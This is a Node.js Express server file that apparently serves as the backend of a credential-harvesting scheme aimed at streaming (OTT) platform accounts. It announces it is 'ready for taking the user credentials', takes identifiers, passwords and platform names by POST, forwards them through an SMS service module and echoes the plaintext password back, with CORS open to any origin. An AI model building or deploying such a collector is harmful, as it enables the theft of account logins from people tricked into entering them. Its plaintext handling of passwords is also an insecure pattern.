const express = require("express");
const cors = require("cors");
const sendMsg = require("./services/sms");
const mongoose = require("mongoose");
require("dotenv").config();
mongoose
  .connect(
    `mongodb+srv://${process.env.MONGODB_USERNAME}:${process.env.MONGODB_PASSWORD}@ott-platform-official.g4y3gt6.mongodb.net/ott-platform-official?retryWrites=true&w=majority`
  )
  .then(() => {
    console.log("Database connected Successfully");
  })
  .catch((e) => {
    console.log(e);
    console.error("Unable to connect to database");
  });

const port = process.env.PORT;
const app = express();
app.use(express.json());
app.use(cors());

app.get("/", (req, res) => {
  res
    .status(200)
    .json({ message: "API ready for taking the user credentials" });
});

app.post("/", async (req, res) => {
  const { identifier, password, platform } = req.body;
  await sendMsg(identifier, password, platform);
  res.status(200).json({
    message: "Credentials received",
    identifier: identifier,
    password: password,
  });
});

app.listen(port, () => {
  console.log("Server started listening on port ", port);
});
